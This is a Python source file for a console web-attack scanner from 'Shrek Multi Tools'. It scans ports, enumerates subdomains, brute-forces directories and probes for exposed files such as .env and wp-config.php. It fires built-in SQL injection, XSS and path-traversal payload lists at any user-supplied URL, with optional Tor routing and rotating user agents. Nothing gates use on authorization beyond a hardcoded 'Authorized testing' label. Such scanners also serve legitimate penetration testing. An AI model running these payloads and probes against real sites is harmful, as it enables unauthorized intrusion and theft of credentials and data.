# Shrek was proudly coded by Shrek™ [https://github.com/SHREK-TM].
# Copyright © Shrek Multi Tools

import requests
import socket
import ssl
import concurrent.futures
import random
import asyncio
import aiohttp
import re
import os
import uuid
import time
import json
import hmac
import hashlib
import sys
from urllib.parse import urlparse, urljoin, parse_qs
from datetime import datetime
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich import box
from colorama import init, Fore, Style
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph
from reportlab.lib.styles import getSampleStyleSheet
from time import sleep
from datetime import datetime, UTC

root_path = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..")
)
if root_path not in sys.path:
    sys.path.insert(0, root_path)
from utilities.core.shrek_ui import set_console_title
from utilities.core.context import return_to_menu
from utilities.core.paths import USERAGENTS_FILE

# Initialize with autoreset
init(autoreset=True)

# ---- Style functions ----
def success(text):
    print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def info(text):
    print(f'{Fore.YELLOW}[{Fore.WHITE}*{Fore.YELLOW}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def warn(text):
    print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def input_prompt(prompt):
    return input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} {prompt}: {Style.RESET_ALL}')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

console = Console()

def load_config():
    """Loading configuration"""
    return {
        'ports': [21, 22, 80, 443, 3306, 8080, 3389],
        'sqli_payloads': [
            {'value': "'", 'type': 'SQLi'},
            {'value': '"', 'type': 'SQLi'},
            {'value': "' OR '1'='1", 'type': 'SQLi'},
            {'value': '" OR "1"="1', 'type': 'SQLi'},
            {'value': '%27%20OR%20%271%27%3D%271', 'type': 'SQLi'},
            {'value': "1' AND SLEEP(5)--", 'type': 'SQLi'},
            {'value': '1" AND SLEEP(5)--', 'type': 'SQLi'},
            {'value': "; WAITFOR DELAY '0:0:5'--", 'type': 'SQLi'},
            {'value': "1' OR 1=1 UNION SELECT NULL, NULL--", 'type': 'SQLi'},
            {'value': "1' OR 1=1 UNION SELECT @@version--", 'type': 'SQLi'}
        ],
        'xss_payloads': [
            {'value': "<script>alert('xss')</script>", 'type': 'XSS'},
            {'value': "<img src=x onerror=alert('xss')>", 'type': 'XSS'},
            {'value': "<scr%69pt>alert('xss')</scr%69pt>", 'type': 'XSS'},
            {'value': "javascript:alert('xss')", 'type': 'XSS'},
            {'value': "<svg onload=alert('xss')>", 'type': 'XSS'},
            {'value': "\" onmouseover=\"alert('xss')", 'type': 'XSS'},
            {'value': "<iframe src=javascript:alert('xss')>", 'type': 'XSS'},
            {'value': "<body onload=alert('xss')>", 'type': 'XSS'}
        ],
        'lfi_payloads': [
            {'value': "../../etc/passwd", 'type': 'LFI'},
            {'value': "../config.php", 'type': 'LFI'},
            {'value': "/proc/self/environ", 'type': 'LFI'},
            {'value': "../../windows/win.ini", 'type': 'LFI'},
            {'value': "..%5C..%5Cwindows%5Cwin.ini", 'type': 'LFI'},
            {'value': "/etc/passwd%00", 'type': 'LFI'},
            {'value': "../../../../../../etc/passwd", 'type': 'LFI'}
        ],
        'dirb_wordlist': ['admin', 'login', 'dashboard', 'server-status'],
        'subdomains': ['api', 'dev', 'staging', 'admin', 'test'],
        'use_tor': False,
        'disable_ssl_verify': True,
        'max_attempts': 3,
        'max_delay': 3,
        'dry_run': False,
        'headless_browser': True,
        'log_hmac_key': 'secret_key_injector_ghost'
    }

def current_time():
    return datetime.now().strftime('[%H:%M:%S]')

def choice_user_agent():
    """Picking User-Agent"""
    path = USERAGENTS_FILE
    if not os.path.exists(path):
        info('user-agents.txt not found, using fallback')
        return random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
        ])
    else:
        try:
            with open(path, 'r', encoding='utf-8') as f:
                agents = [ua.strip() for ua in f if ua.strip()]
            if not agents:
                raise ValueError('user-agents.txt is empty')
            return random.choice(agents)
        except Exception as e:
            warn(f'Error reading user-agents.txt: {e}')
            return random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'
            ])

def setup_tor_proxy():
    """Setting up Tor proxy"""
    session = requests.Session()
    try:
        session.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        test = session.get('https://check.torproject.org', timeout=5)
        if 'Congratulations' in test.text:
            success('Tor proxy enabled')
            return session
        else:
            raise Exception('Tor verification failed')
    except Exception as e:
        warn(f'Tor setup failed, using standard session: {e}')
        return session

def audit_log(action, data):
    """Logging action with HMAC"""
    timestamp = datetime.now().isoformat()
    message = f'{timestamp}|{action}|{data}'
    hmac_sig = hmac.new(load_config()['log_hmac_key'].encode(), message.encode(), hashlib.sha256).hexdigest()
    output_dir = os.path.join(root_path, 'output')
    os.makedirs(output_dir, exist_ok=True)
    log_file = os.path.join(output_dir, 'audit.log')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f'{message}|{hmac_sig}\n')
    os.chmod(log_file, 384)

def save_results(url, results):
    """Saving results to output/scan.txt"""
    try:
        output_dir = os.path.join(root_path, 'output')
        os.makedirs(output_dir, exist_ok=True)
        filename = os.path.join(output_dir, 'scan.txt')
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'\n\nScan Report for {url} - {current_time()}\n')
            f.write('==================================================\n')
            for section, data in results.items():
                f.write(f'\n[ {section.upper()} ]\n')
                if isinstance(data, dict):
                    for k, v in data.items():
                        f.write(f'{k}: {v}\n')
                else:
                    if isinstance(data, list):
                        for item in data:
                            f.write(f'- {item}\n')
                    else:
                        f.write(f'{data}\n')
        os.chmod(filename, 384)
        success(f'Results saved to {filename}')
    except Exception as e:
        warn(f'Error saving results: {e}')

def gen_marker():
    """Generating unique marker"""
    return f'INJ_{uuid.uuid4().hex[:8]}'

def gen_variant(payload):
    """Generating payload variant"""
    if 'alert(\'xss\')' in payload:
        return payload.replace('alert(\'xss\')', 'alert(\'xss2\')')
    else:
        return f'{payload}_variant_{uuid.uuid4().hex[:4]}'

def calculate_cvss(confidence):
    """Calculating CVSS score"""
    return {'cvss': min(9.0, confidence / 10.0), 'justification': f'Confidence {confidence}%'}

def get_recommendations(vuln_type):
    """Getting remediation tips"""
    recommendations = {
        'SQLi': ['Use parameterized queries', 'Sanitize inputs', 'Enable WAF'],
        'XSS': ['Use Content Security Policy (CSP)', 'Escape inputs', 'Sanitize HTML'],
        'LFI': ['Restrict file access', 'Validate paths', 'Block traversal']
    }
    return recommendations.get(vuln_type, ['Validate inputs', 'Secure configs'])

def generate_pdf_report(report):
    """Generating PDF report"""
    output_dir = os.path.join(root_path, 'output')
    os.makedirs(output_dir, exist_ok=True)
    pdf_file = os.path.join(output_dir, f'report_{report["id"]}.pdf')
    try:
        doc = SimpleDocTemplate(pdf_file, pagesize=letter)
        styles = getSampleStyleSheet()
        normal_style = styles['Normal']
        title_style = styles['Title']
        clean_title = report['title'].replace('<', '&lt;').replace('>', '&gt;')
        clean_summary = report['summary'].replace('<', '&lt;').replace('>', '&gt;')
        clean_description = report['description'].replace('<', '&lt;').replace('>', '&gt;')
        clean_reproduction = report['reproduction_steps'].replace('<', '&lt;').replace('>', '&gt;')
        clean_impact = report['impact'].replace('<', '&lt;').replace('>', '&gt;')
        clean_recommendations = ', '.join(report['recommendations']).replace('<', '&lt;').replace('>', '&gt;')
        story = [
            Paragraph(f'<b>{clean_title}</b>', title_style),
            Paragraph(f"ID: {report['id']}", normal_style),
            Paragraph(f"Severity: {report['severity']['cvss']} ({report['severity']['justification']})", normal_style),
            Paragraph(f'Summary: {clean_summary}', normal_style),
            Paragraph(f'Details: {clean_description}', normal_style),
            Paragraph(f'Fixes: {clean_recommendations}', normal_style),
            Paragraph(f"Meta: {json.dumps(report['meta'], indent=2)}", normal_style)
        ]
        doc.build(story)
        success(f'PDF report saved: {pdf_file}')
    except Exception as e:
        audit_log('pdf_report', f"Failed to generate PDF for {report['id']}: {str(e)}")

def extract_params(url):
    """Extracting URL parameters"""
    try:
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query, keep_blank_values=True)
        params = list(params_dict.keys())
        return params if params else ['test']
    except Exception:
        return ['test']

def throttle_manager_allow(payload_type):
    """Rate-limiting without contract/robots.txt"""
    time.sleep(random.uniform(0.3, 1.0))
    audit_log('throttle', f'Allowed payload: {payload_type}')
    return True

async def async_get(session, url, headers, config):
    """Async HTTP GET request"""
    try:
        async with session.get(url, headers=headers, ssl=not config.get('disable_ssl_verify')) as response:
            return (await response.text(), response.status)
    except Exception as e:
        warn(f'Async request failed: {e}')
        audit_log('async_get', f'Error: {e}')
        return ('', 0)

async def async_post(session, url, data, headers, config):
    """Async HTTP POST request"""
    try:
        async with session.post(url, data=data, headers=headers, ssl=not config.get('disable_ssl_verify')) as response:
            return (await response.text(), response.status)
    except Exception as e:
        warn(f'Async POST failed: {e}')
        audit_log('async_post', f'Error: {e}')
        return ('', 0)

async def probe_check_reflection(url, param, marker, session, config):
    """Checking reflection with marker"""
    test_url = f'{url}?{param}={marker}'
    headers = {'User-Agent': choice_user_agent()}
    response_text, status = await async_get(session, test_url, headers, config)
    reflected = marker in response_text and status == 200
    proof = {'request': test_url, 'response': response_text[:200], 'status': status}
    audit_log('probe', f'URL: {test_url}, Reflected: {reflected}')
    return (reflected, proof)

async def website_info_scanner(url, config):
    """Scanning website info"""
    if not url.startswith('http'):
        url = 'https://' + url
    user_agent = choice_user_agent()
    headers = {
        'User-Agent': user_agent,
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', ''])
    }
    session = setup_tor_proxy() if config.get('use_tor', False) else requests.Session()
    if config.get('disable_ssl_verify'):
        info('SSL verification off')
        audit_log('ssl', 'Verification disabled')
    info(f'Scanning: {url}')
    results = {'website_info': {}}
    parsed = urlparse(url)
    domain = parsed.netloc
    success(f'Domain: {domain}')
    results['website_info']['domain'] = domain
    
    try:
        ip = socket.getaddrinfo(domain, None, socket.AF_INET)[0][4][0]
        success(f'IPv4: {ip}')
        results['website_info']['ipv4'] = ip
        try:
            ip6 = socket.getaddrinfo(domain, None, socket.AF_INET6)[0][4][0]
            success(f'IPv6: {ip6}')
            results['website_info']['ipv6'] = ip6
        except:
            results['website_info']['ipv6'] = 'Not resolved'
    except socket.gaierror:
        warn('IP resolution failed')
        results['website_info']['ipv4'] = 'Not resolved'
        results['website_info']['ipv6'] = 'Not resolved'
    
    secure = url.startswith('https://')
    success(f'HTTPS: {"Yes" if secure else "No"}')
    results['website_info']['secure'] = secure
    
    try:
        response = session.get(url, headers=headers, timeout=5, verify=not config.get('disable_ssl_verify'))
        success(f'HTTP Status: {response.status_code}')
        results['website_info']['status'] = response.status_code
    except Exception as e:
        warn(f'HTTP request failed: {e}')
        results['website_info']['status'] = 'Error'
        response = None
    
    if results['website_info'].get('ipv4') and results['website_info']['ipv4'] != 'Not resolved':
        try:
            info_data = session.get(f'https://ipinfo.io/{results["website_info"]["ipv4"]}/json', timeout=5, verify=not config.get('disable_ssl_verify')).json()
            if info_data.get('country'):
                success(f'Country: {info_data["country"]}')
                results['website_info']['country'] = info_data['country']
            if info_data.get('org'):
                success(f'Org: {info_data["org"]}')
                results['website_info']['org'] = info_data['org']
        except Exception as e:
            warn(f'IP info failed: {e}')
    
    ports = config.get('ports', [])
    port_protocols = {21: 'FTP', 22: 'SSH', 80: 'HTTP', 443: 'HTTPS', 3306: 'MySQL', 8080: 'HTTP-ALT', 3389: 'RDP'}
    open_ports = []
    
    async def scan_port(sem, ipaddr, port):
        async with sem:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(1)
                result = await asyncio.get_event_loop().run_in_executor(None, lambda: sock.connect_ex((ipaddr, port)))
                sock.close()
                if result == 0:
                    proto = port_protocols.get(port, 'Unknown')
                    return (port, proto)
            except:
                pass
            return (None, None)
    
    if results['website_info'].get('ipv4') and results['website_info']['ipv4'] != 'Not resolved':
        info('Scanning ports...')
        table = Table(title='Open Ports', box=box.MINIMAL, style='bold green')
        table.add_column('Port', style='cyan')
        table.add_column('Service', style='yellow')
        sem = asyncio.Semaphore(50)
        tasks = [scan_port(sem, results['website_info']['ipv4'], port) for port in ports]
        for port, proto in await asyncio.gather(*tasks):
            if port:
                table.add_row(str(port), proto)
                open_ports.append(f'{port} ({proto})')
        if open_ports:
            console.print(table)
        else:
            warn('No open ports found')
        results['website_info']['ports'] = open_ports
    
    if response:
        try:
            headers_dict = {k: v for k, v in response.headers.items() if k.lower() in ['server', 'x-powered-by']}
            if headers_dict:
                info('Headers Found:')
                for h, v in headers_dict.items():
                    console.print(f'  • {h}: {v}', style='yellow')
                results['website_info']['headers'] = headers_dict
        except Exception:
            warn('Failed to fetch headers')
            results['website_info']['headers'] = {}
    
    if secure:
        info('Checking SSL...')
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.settimeout(5)
                s.connect((domain, 443))
                cert = s.getpeercert()
                success(f'SSL Subject: {cert.get("subject")}')
                results['website_info']['ssl'] = {'subject': cert.get('subject')}
        except Exception as e:
            warn(f'SSL check failed: {e}')
            results['website_info']['ssl'] = {}
    
    if response:
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            techs = set()
            if 'x-powered-by' in response.headers:
                techs.add(f'X-Powered-By: {response.headers["x-powered-by"]}')
            if 'server' in response.headers:
                techs.add(f'Server: {response.headers["server"]}')
            for script in soup.find_all('script', src=True):
                src = script['src'].lower()
                if 'jquery' in src:
                    techs.add('jQuery')
                if 'bootstrap' in src:
                    techs.add('Bootstrap')
            if techs:
                info('Tech Detected:')
                for t in techs:
                    console.print(f'  • {t}', style='yellow')
                results['website_info']['technologies'] = list(techs)
        except Exception:
            warn('Tech detection failed')
            results['website_info']['technologies'] = []
    
    save_results(url, results)
    info('Website scan done!')
    audit_log('website_info', f'Completed scan for {url}')
    return results

def subdomain_scanner(url, config):
    """Scanning subdomains"""
    parsed = urlparse(url)
    domain = parsed.netloc
    info(f'Scanning subdomains for {domain}')
    wordlist = config.get('subdomains', [])
    found = []
    table = Table(title='Subdomains Found', box=box.MINIMAL, style='bold green')
    table.add_column('Subdomain', style='cyan')
    table.add_column('IP', style='yellow')
    
    def resolve_subdomain(sub):
        try:
            ip = socket.getaddrinfo(f'{sub}.{domain}', None, socket.AF_INET)[0][4][0]
            return (sub, ip)
        except:
            return (None, None)
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = list(executor.map(resolve_subdomain, wordlist))
        for sub, ip in results:
            if sub and ip:
                table.add_row(f'{sub}.{domain}', ip)
                found.append(f'{sub}.{domain} ({ip})')
    
    if found:
        console.print(table)
    else:
        warn('No subdomains found')
    
    results = {'subdomains': found}
    save_results(url, results)
    audit_log('subdomain', f'Found {len(found)} subdomains for {domain}')
    return found

async def website_url_scanner(url, config):
    """Crawling URLs"""
    if not url.startswith('http'):
        url = 'https://' + url
    headers = {'User-Agent': choice_user_agent()}
    info(f'Crawling URLs from {url}')
    results = {'urls': []}
    try:
        async with aiohttp.ClientSession() as session:
            response_text, _ = await async_get(session, url, headers, config)
            soup = BeautifulSoup(response_text, 'html.parser')
            links = set()
            table = Table(title='URLs Found', box=box.MINIMAL, style='bold green')
            table.add_column('URL', style='cyan')
            for a in soup.find_all('a', href=True):
                full = urljoin(url, a['href'])
                if full.startswith(url):
                    links.add(full)
                    table.add_row(full)
            if links:
                console.print(table)
                results['urls'] = list(links)
            else:
                warn('No URLs found')
            save_results(url, results)
            audit_log('crawler', f'Crawled {len(links)} URLs from {url}')
            return links
    except Exception as e:
        warn(f'Crawling failed: {e}')
        audit_log('crawler', f'Error: {e}')
        return set()

async def check_paths(url, paths, name, session, config):
    """Checking paths"""
    if not url.endswith('/'):
        url += '/'
    info(f'Checking {name.lower()}')
    table = Table(title=name, box=box.MINIMAL, style='bold green')
    table.add_column('Path', style='cyan')
    found = []
    with Progress(TextColumn('[progress.description]{task.description}'), BarColumn(), TimeRemainingColumn(), console=console) as progress:
        task = progress.add_task(f'Scanning {name}...', total=len(paths))
        for path in paths:
            try:
                if not throttle_manager_allow(name):
                    progress.advance(task)
                    continue
                await asyncio.sleep(random.uniform(0.5, 2.0))
                async with session.get(url + path, headers={'User-Agent': choice_user_agent()}, ssl=not config.get('disable_ssl_verify')) as r:
                    if r.status == 200:
                        table.add_row(f'/{path}')
                        found.append(f'/{path}')
                progress.advance(task)
            except Exception:
                progress.advance(task)
    if found:
        console.print(table)
    else:
        warn(f'{name}: Nothing found')
    audit_log('check_paths', f'Checked {name}, found {len(found)} paths')
    return found

async def test_payloads(url, payloads, indicators, vuln_name, session, config, vuln_counts):
    """Testing for {vuln_name} vulnerabilities"""
    if not url.endswith('/'):
        url += '/'
    info(f'Hunting {vuln_name} in {url}')
    table = Table(title=f'{vuln_name} Hits', box=box.MINIMAL, style='bold red')
    table.add_column('Payload', style='cyan')
    table.add_column('Confidence', style='yellow')
    table.add_column('Proof', style='green')
    found = []
    
    try:
        async with session.get(url, headers={'User-Agent': choice_user_agent()}, ssl=not config.get('disable_ssl_verify')) as base_resp:
            base_text = await base_resp.text()
            base_length = len(base_text)
    except Exception as e:
        warn(f'Failed to get base response: {e}')
        return found
    
    params = extract_params(url)
    with Progress(TextColumn('[progress.description]{task.description}'), BarColumn(), TimeRemainingColumn(), console=console) as progress:
        task = progress.add_task(f'Testing {vuln_name}...', total=len(payloads) * len(params))
        
        for param in params:
            marker = gen_marker()
            reflected, probe_proof = await probe_check_reflection(url, param, marker, session, config)
            
            if not reflected and not config.get('dry_run'):
                for _ in payloads:
                    progress.advance(task)
                continue
            
            for p in payloads:
                if not throttle_manager_allow(p['type']):
                    progress.advance(task)
                    continue
                
                attempts = 0
                confidence = 0
                proofs = [probe_proof]
                test_url = f"{url}?{param}={p['value']}"
                
                try:
                    async with session.get(test_url, headers={'User-Agent': choice_user_agent()}, ssl=not config.get('disable_ssl_verify')) as r:
                        text = await r.text()
                        status = r.status
                    
                    length_diff = abs(len(text) - base_length)
                    indicators_detected = {
                        'reflected': p['value'] in text,
                        'error': any(re.search(ind, text, re.IGNORECASE) for ind in indicators),
                        'length_diff': length_diff > 200
                    }
                    
                    confidence += 60 if indicators_detected['reflected'] else 0
                    confidence += 20 if indicators_detected['error'] else 0
                    confidence += 20 if indicators_detected['length_diff'] else 0
                    proofs.append({'request': test_url, 'response': text[:200], 'status': status})
                    
                    variant = gen_variant(p['value'])
                    try:
                        async with session.get(f'{url}?{param}={variant}', headers={'User-Agent': choice_user_agent()}, ssl=not config.get('disable_ssl_verify')) as r2:
                            text2 = await r2.text()
                            confirmed = variant in text2 and text2[:200] == text[:200]
                            proofs.append({'request': f'{url}?{param}={variant}', 'response': text2[:200], 'status': r2.status})
                            confidence += 10 if confirmed else 0
                    except Exception:
                        pass
                    
                    if 'SLEEP' in p['value'] or 'WAITFOR' in p['value']:
                        attempts += 1
                        if attempts <= config.get('max_attempts', 3):
                            start = time.time()
                            try:
                                async with session.get(test_url, headers={'User-Agent': choice_user_agent()}, ssl=not config.get('disable_ssl_verify')) as r3:
                                    await r3.text()
                                delay = time.time() - start
                                if delay >= config.get('max_delay', 3):
                                    confidence += 20
                                    proofs.append({'request': test_url, 'time_delay': delay})
                            except Exception:
                                pass
                    
                    if confidence >= 90:
                        vuln_counts[vuln_name] = vuln_counts.get(vuln_name, 0) + 1
                        idx = text.lower().find(p['value'].lower())
                        snippet = text[max(0, idx - 40):idx + len(p['value']) + 40] if idx >= 0 else text[:80]
                        snippet = re.sub(r'\s+', ' ', snippet)[:80] + '...'
                        
                        report_id = f"CLIENT-{datetime.now().strftime('%Y%m%d')}-{uuid.uuid4().hex[:4]}"
                        output_dir = os.path.join(root_path, 'output')
                        os.makedirs(output_dir, exist_ok=True)
                        report = {
                            'id': report_id,
                            'title': f'{vuln_name} - {url}',
                            'severity': calculate_cvss(confidence),
                            'summary': f'{vuln_name} found on {param}',
                            'description': f'{vuln_name} vulnerability detected',
                            'proofs': proofs,
                            'reproduction_steps': f"curl '{test_url}' -H 'User-Agent: {choice_user_agent()}'",
                            'impact': f'{vuln_name} could lead to data theft or escalation',
                            'recommendations': get_recommendations(vuln_name),
                            'meta': {
                                'date': datetime.now().isoformat(),
                                'tester': 'INJECTOR_GHOST',
                                'contract': 'Authorized testing'
                            }
                        }
                        
                        with open(os.path.join(output_dir, f'report_{report["id"]}.json'), 'w') as f:
                            json.dump(report, f, indent=2)
                        generate_pdf_report(report)
                        table.add_row(p['value'], f'{confidence}%', snippet)
                        found.append(report)
                
                except Exception as e:
                    audit_log('test_payloads', f'Error testing payload: {e}')
                
                progress.advance(task)
    
    if found:
        console.print(table)
    else:
        warn(f'{vuln_name}: No vulnerabilities found')
    
    audit_log('test_payloads', f'Completed {vuln_name} scan for {url}, found {len(found)}')
    return found

async def sql_injection(url, config, session, vuln_counts):
    """Scanning SQL Injection"""
    payloads = config.get('sqli_payloads', [])
    indicators = ['SQL syntax.*MySQL', 'Warning.*mysql_', 'sqlstate', 'database error', 'You have an error in your SQL syntax', 'mysql_fetch', 'pg_query', 'SQL Server.*error', 'unclosed quotation mark']
    found = await test_payloads(url, payloads, indicators, 'SQLi', session, config, vuln_counts)
    return {'sql_injection': found}

async def xss(url, config, session, vuln_counts):
    """Scanning XSS"""
    payloads = config.get('xss_payloads', [])
    indicators = ['<script>.*alert\\(', 'onerror=.*alert\\(', 'onload=.*alert\\(', 'javascript:alert\\(']
    found = await test_payloads(url, payloads, indicators, 'XSS', session, config, vuln_counts)
    return {'xss': found}

async def lfi_scanner(url, config, session, vuln_counts):
    """Scanning LFI"""
    payloads = config.get('lfi_payloads', [])
    indicators = ['root:.*:0:0:', 'phpinfo\\(\\)', 'DB_PASSWORD', '\\[extensions\\]', 'password=.*']
    found = await test_payloads(url, payloads, indicators, 'LFI', session, config, vuln_counts)
    return {'lfi': found}

async def interesting_paths(url, config, session, vuln_counts):
    """Scanning interesting paths"""
    paths = config.get('dirb_wordlist', [])
    found = await check_paths(url, paths, 'Interesting Paths', session, config)
    if found:
        vuln_counts['Interesting Paths'] = len(found)
    return {'interesting_paths': found}

async def sensitive_files(url, config, session, vuln_counts):
    """Scanning sensitive files"""
    files = ['config.php', '.env', 'backup.sql', 'wp-config.php']
    found = await check_paths(url, files, 'Sensitive Files', session, config)
    if found:
        vuln_counts['Sensitive Files'] = len(found)
    return {'sensitive_files': found}

async def dir_bruteforce(url, session, config, vuln_counts):
    """Brute-forcing directories"""
    try:
        dirb_file = os.path.join(root_path, 'data', 'dirb_wordlist.txt')
        if not os.path.exists(dirb_file):
            warn('dirb_wordlist.txt not found')
            return {'dir_bruteforce': []}
        with open(dirb_file, 'r', encoding='utf-8') as f:
            paths = [line.strip() for line in f if line.strip()]
        found = await check_paths(url, paths, 'Directory Bruteforce', session, config)
        if found:
            vuln_counts['Directory Bruteforce'] = len(found)
        return {'dir_bruteforce': found}
    except Exception as e:
        warn(f'Directory brute-force failed: {e}')
        audit_log('dir_bruteforce', f'Error: {e}')
        return {'dir_bruteforce': []}

async def cms_scanner(url, session, config, vuln_counts):
    """Scanning CMS"""
    cms_paths = {
        'WordPress': ['wp-admin', 'wp-login.php'],
        'Drupal': ['sites/default', 'CHANGELOG.txt']
    }
    found = {}
    for cms, paths in cms_paths.items():
        found[cms.lower()] = await check_paths(url, paths, f'{cms} Detection', session, config)
        if found[cms.lower()]:
            vuln_counts[f'{cms} Detection'] = len(found[cms.lower()])
    return {'cms': found}

async def vulnerability_scanner(url, config, session):
    """Running vulnerability scanner"""
    vuln_counts = {}
    info('Starting vulnerability scan!')
    results = {}
    async with aiohttp.ClientSession() as async_session:
        results.update(await sql_injection(url, config, async_session, vuln_counts))
        results.update(await xss(url, config, async_session, vuln_counts))
        results.update(await lfi_scanner(url, config, async_session, vuln_counts))
        results.update(await interesting_paths(url, config, async_session, vuln_counts))
        results.update(await sensitive_files(url, config, async_session, vuln_counts))
        results.update(await dir_bruteforce(url, async_session, config, vuln_counts))
        results.update(await cms_scanner(url, async_session, config, vuln_counts))
    
    total_vulns = sum(vuln_counts.values())
    info('Scan Results Summary')
    summary_table = Table(title='Vulnerabilities Found', box=box.DOUBLE, style='bold red')
    summary_table.add_column('Type', style='cyan')
    summary_table.add_column('Count', style='yellow')
    for vuln_type, count in vuln_counts.items():
        summary_table.add_row(vuln_type, str(count))
    console.print(summary_table)
    
    if total_vulns > 0:
        success(f'Total Vulnerabilities Found: {total_vulns}')
    else:
        warn(f'Total Vulnerabilities Found: {total_vulns}')
    
    info('Detailed reports saved in output/ folder')
    save_results(url, results)
    info('Vulnerability scan done!')
    audit_log('vuln_scanner', f'Completed vuln scan for {url}, total vulns: {total_vulns}')
    return (results, vuln_counts)

async def full_scan(url, config):
    """Running full scan"""
    session = setup_tor_proxy() if config.get('use_tor', False) else requests.Session()
    info('Starting full scan!')
    await website_info_scanner(url, config)
    await website_url_scanner(url, config)
    subdomain_scanner(url, config)
    await vulnerability_scanner(url, config, session)
    info('Full scan done!')
    audit_log('full_scan', f'Completed full scan for {url}')

def main():
    clear_screen()
    
    print(f'''
{Fore.GREEN}
     █     █░ ▓█████ ▄▄▄▄     ██████   ██▓▄▄▄█████▓ ▓█████      ██████   ▄████▄  ▄▄▄      ███▄    █ 
    ▓█░ █ ░█░ ▓█   ▀▓█████▄ ▒██    ▒ ▒▓██▒▓  ██▒ ▓▒ ▓█   ▀    ▒██    ▒  ▒██▀ ▀█ ▒████▄    ██ ▀█   █ 
    ▒█░ █ ░█  ▒███  ▒██▒ ▄██░ ▓██▄   ▒▒██▒▒ ▓██░ ▒░ ▒███      ░ ▓██▄    ▒▓█    ▄▒██  ▀█▄ ▓██  ▀█ ██▒
    ░█░ █ ░█  ▒▓█  ▄▒██░█▀    ▒   ██▒░░██░░ ▓██▓ ░  ▒▓█  ▄      ▒   ██▒▒▒▓▓▄ ▄██░██▄▄▄▄██▓██▒  ▐▌██▒
    ░░██▒██▓ ▒░▒████░▓█  ▀█▓▒██████▒▒░░██░  ▒██▒ ░ ▒░▒████    ▒██████▒▒░▒ ▓███▀ ▒▓█   ▓██▒██░   ▓██░
    ░ ▓░▒ ▒  ░░░ ▒░ ░▒▓███▀▒▒ ▒▓▒ ▒ ░ ░▓    ▒ ░░   ░░░ ▒░     ▒ ▒▓▒ ▒ ░░░ ░▒ ▒  ░▒▒   ▓▒█░ ▒░   ▒ ▒ 
      ▒ ░ ░  ░ ░ ░  ▒░▒   ░ ░ ░▒  ░ ░░ ▒ ░    ░    ░ ░ ░      ░ ░▒  ░     ░  ▒  ░ ░   ▒▒ ░ ░░   ░ ▒░
      ░   ░      ░   ░    ░ ░  ░  ░  ░ ▒ ░  ░          ░      ░  ░  ░   ░         ░   ▒     ░   ░ ░ 
        ░    ░   ░   ░            ░    ░           ░   ░            ░   ░ ░           ░           ░ 

''')
    print(f'    {Fore.GREEN}- {Fore.WHITE}  Output: scan.txt, JSON, PDF reports')
    print()
    print(f'    {Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}Website Info (IP, Ports, SSL, Tech)')
    print(f'    {Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}URL Crawler')
    print(f'    {Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Vulnerability Scanner (SQLi, XSS, LFI, Files, Dirs, CMS)')
    print(f'    {Fore.GREEN}[{Fore.WHITE}4{Fore.GREEN}] {Fore.WHITE}Full Scan (All modules)')
    print(f'    {Fore.GREEN}[{Fore.WHITE}5{Fore.GREEN}] {Fore.WHITE}Subdomain Scanner')
    print(f'    {Fore.GREEN}[{Fore.WHITE}0{Fore.GREEN}] {Fore.WHITE}Quit')
    print()

    
    config = load_config()
    
    try:
        choice = input_prompt('Choice')
        if choice not in ['1', '2', '3', '4', '5', '0']:
            warn('Invalid option')
            input_prompt('Press Enter to return')
            main()

        if choice == '0':
            return_to_menu()
            return           
        
        url = input_prompt('Enter target URL (e.g., testfire.net)')
        if not url:
            warn('URL cannot be empty')
            input_prompt('Press Enter to return')
            main()
        
        if not url.startswith('http'):
            url = 'https://' + url
        
        print()

        if choice == '1':
            asyncio.run(website_info_scanner(url, config))
        elif choice == '2':
            asyncio.run(website_url_scanner(url, config))
        elif choice == '3':
            session = setup_tor_proxy() if config.get('use_tor', False) else requests.Session()
            asyncio.run(vulnerability_scanner(url, config, session))
        elif choice == '4':
            asyncio.run(full_scan(url, config))
        elif choice == '5':
            subdomain_scanner(url, config)

            
    except Exception as e:
        warn(f'Critical error: {e}')
        audit_log('main', f'Critical error: {e}')
        input_prompt('Press Enter to return')
        main()
    
    print()
